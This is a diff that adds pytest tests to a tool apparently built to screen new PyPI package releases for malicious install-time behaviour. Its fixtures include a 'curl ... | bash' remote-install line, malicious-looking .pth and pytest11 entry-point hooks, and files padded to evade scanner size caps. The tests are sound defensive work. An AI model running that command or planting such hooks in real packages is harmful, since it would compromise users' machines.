@@ -234,3 +234,109 @@ def test_extracts_pth_and_entry_points_and_top_level():
     assert "evil.pth" in files
     assert "pkg.egg-info/entry_points.txt" in files
     assert "pkg.egg-info/top_level.txt" in files
+
+
+def test_new_package_surface_keeps_the_metadata_the_execution_context_reads(monkeypatch):
+    # The block must not tell the reviewer "commands: none" for a first release whose egg-info lists them.
+    from pydiffwatch import differ
+    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("brandnew", [
+        ("1.0", "2026-01-01T00:00:00Z")]))
+    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: make_sdist({
+        "setup.py": b"from setuptools import setup\nsetup()\n",
+        "PKG-INFO": b"Metadata-Version: 2.1\nName: brandnew\n",
+        "brandnew/__init__.py": b"",
+        "brandnew/cli.py": b"def main(): pass\n",
+        "brandnew.egg-info/entry_points.txt": b"[console_scripts]\nbn = brandnew.cli:main\n\n[pytest11]\nbn = brandnew.plug\n",
+        "brandnew.egg-info/top_level.txt": b"brandnew\n",
+        "brandnew.egg-info/SOURCES.txt": b"x\n",
+        "vendor/other.egg-info/entry_points.txt": b"[console_scripts]\nv = v:main\n"}))
+    art = fetcher.fetch_artifacts(Config(), NewRelease("brandnew", "1.0", 5))   # default policy=surface
+    assert set(art.new_files) == {"setup.py", "brandnew/__init__.py",           # no PKG-INFO: nothing reads it
+                                  "brandnew.egg-info/entry_points.txt", "brandnew.egg-info/top_level.txt"}
+    ctx = differ.build_diff(art).exec_context
+    assert "bn -> brandnew.cli:main" in ctx and "pytest11: bn -> brandnew.plug" in ctx
+    assert "top_level.txt=brandnew" in ctx
+
+
+def test_a_large_pkg_info_never_crowds_setup_py_out_of_a_first_release_review(monkeypatch):
+    # PKG-INFO's body is the whole README (up to ~1 MB), in two copies; the block never reads it, and it sorts
+    # before setup.py / pyproject.toml, so it must stay out of the surface or it cuts them from the input.
+    from pydiffwatch import differ, reviewer
+    from pydiffwatch.models import TriageResult
+    pkginfo = (b"Metadata-Version: 2.1\nName: brandnew\n\n# brandnew\ncurl -sSL https://example.invalid/i.sh | bash\n"
+               + (b"x" * 150 + b"\n") * 1200)
+    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("brandnew", [
+        ("1.0", "2026-01-01T00:00:00Z")]))
+    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: make_sdist({
+        "PKG-INFO": pkginfo, "brandnew.egg-info/PKG-INFO": pkginfo,
+        "setup.py": b"from setuptools import setup\nsetup(name='brandnew')\n",
+        "pyproject.toml": b"[build-system]\nrequires=['setuptools']\nbuild-backend='setuptools.build_meta'\n",
+        "brandnew/__init__.py": b"__version__ = '1.0'\n"}))
+    art = fetcher.fetch_artifacts(Config(), NewRelease("brandnew", "1.0", 5))
+    text = reviewer.build_review_input(differ.build_diff(art), TriageResult(50.0, [], True),
+                                       max_chars=Config().reviewer.max_input_chars)
+    lines = text.split("\n")
+    assert "--- file: setup.py (added) ---" in lines and "--- file: pyproject.toml (added) ---" in lines
+    assert "PKG-INFO" not in text and "curl -sSL" not in text
+
+
+def _oversized_setup():
+    return (b"from setuptools import setup\nsetup(entry_points={'pytest11': ['p = evil:hook']})\n"
+            + b"# pad\n" * 200_000)                                             # > 1 MiB max_source_file_bytes
+
+
+@pytest.mark.parametrize("prior_has_it", [False, True])
+def test_an_oversized_setup_py_is_unknown_in_the_block_never_absent(monkeypatch, prior_has_it):
+    # Padding setup.py past the source cap must not turn "runs at build, declares pytest11" into "absent, none",
+    # including on an update where the same oversized setup.py was already in the prior sdist.
+    from pydiffwatch import differ
+    big = _oversized_setup()
+    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
+        ("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-01-02T00:00:00Z")]))
+    blobs = {"mock://acme/1.0": make_sdist({"acme/__init__.py": b"x = 1\n", **({"setup.py": big} if prior_has_it else {})}),
+             "mock://acme/1.1": make_sdist({"acme/__init__.py": b"x = 2\n", "setup.py": big})}
+    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
+    monkeypatch.setattr(fetcher, "_screen_added_deps", lambda *a, **k: [])
+    art = fetcher.fetch_artifacts(Config(), NewRelease("acme", "1.1", 5))
+    assert "setup.py" not in art.new_files and art.too_large == ("setup.py",)
+    ctx = differ.build_diff(art).exec_context
+    assert "setup.py=unknown (too large to scan)" in ctx and "absent" not in ctx
+    assert "plugins" in ctx and "unknown (setup.py too large)" in ctx
+
+
+def test_oversized_pth_and_egg_info_entry_points_are_unknown_in_the_block(monkeypatch):
+    from pydiffwatch import differ
+    pad = b"# pad\n" * 200_000                                                        # > 1 MiB max_source_file_bytes
+    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
+        ("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-01-02T00:00:00Z")]))
+    blobs = {"mock://acme/1.0": make_sdist({"acme/__init__.py": b"x = 1\n"}),
+             "mock://acme/1.1": make_sdist({"acme/__init__.py": b"x = 2\n", "evil.pth": b"import os\n" + pad,
+                                            "acme.egg-info/entry_points.txt": b"[pytest11]\np = evil:hook\n" + pad})}
+    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
+    monkeypatch.setattr(fetcher, "_screen_added_deps", lambda *a, **k: [])
+    art = fetcher.fetch_artifacts(Config(), NewRelease("acme", "1.1", 5))
+    ctx = differ.build_diff(art).exec_context
+    assert "unknown (evil.pth too large to scan)" in ctx
+    assert "unknown (acme.egg-info/entry_points.txt too large)" in ctx
+
+
+@pytest.mark.parametrize("ep", [b"[pytest11]\np = e:h\n", b"#\n" * 600_000])      # small, and > 1 MiB
+def test_a_top_level_entry_points_txt_never_breaks_build_diff(ep):
+    from pydiffwatch import differ
+    from pydiffwatch.models import ArtifactSet
+    nf, bins = fetcher.extract_sdist(make_sdist({"acme/__init__.py": b"x = 2\n", "entry_points.txt": ep}), Config())
+    too_large = tuple(b["path"] for b in bins if b.get("reason") == "source-too-large")
+    d = differ.build_diff(ArtifactSet("acme", "1.1", "1.0", "sdist", nf, {}, {}, [], too_large=too_large))
+    assert "plugins" in d.exec_context
+
+
+def test_a_first_flit_release_keeps_its_top_level_entry_points_txt(monkeypatch):
+    # old-style flit reads entry_points.txt at the sdist root; the surface filter must not turn it into "none"
+    from pydiffwatch import differ
+    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("brandnew", [("1.0", "2026-01-01T00:00:00Z")]))
+    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: make_sdist({
+        "pyproject.toml": b"[build-system]\nbuild-backend = 'flit_core.buildapi'\n[tool.flit.metadata]\nmodule = 'a'\n",
+        "a/__init__.py": b"", "entry_points.txt": b"[pytest11]\np = evil:hook\n"}))
+    art = fetcher.fetch_artifacts(Config(), NewRelease("brandnew", "1.0", 5))   # default policy=surface
+    assert "entry_points.txt" in art.new_files
+    assert "pytest11: p -> evil:hook" in differ.build_diff(art).exec_context
